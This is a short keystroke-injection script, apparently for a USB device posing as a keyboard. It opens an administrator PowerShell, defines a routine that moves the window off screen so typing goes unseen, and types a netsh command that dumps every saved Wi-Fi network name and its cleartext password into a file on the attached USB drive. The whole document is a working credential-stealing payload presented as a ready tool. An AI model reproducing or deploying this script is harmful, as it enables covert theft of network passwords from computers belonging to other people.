function fast() { //sets typing speed as fast as possible with no randomness 
  	typingSpeed(0,0)
}
function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
	press("GUI x");
	delay(50);
	press("a");
	delay(500);
	press("LEFT");
	delay(50);
	press("ENTER");
	delay(200);
}
function hidePS() { //moves powershell window far outside of screeen coords but keeps window in focus to allow typing off screen
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}
function scrapeWiFi() { //scrapes wifi passwords
	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name") //gets usb path based on device name
  	press("ENTER");
  	type("cd $usbPath.name")
	press("ENTER");
  	type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> test.txt')
	press("ENTER");
  	delay(500);
}
function exitPS() { //exits Powershell
	type("exit")
	press("ENTER");
}

layout('us');
fast();
startPS();
//hidePS();
scrapeWiFi();
exitPS();
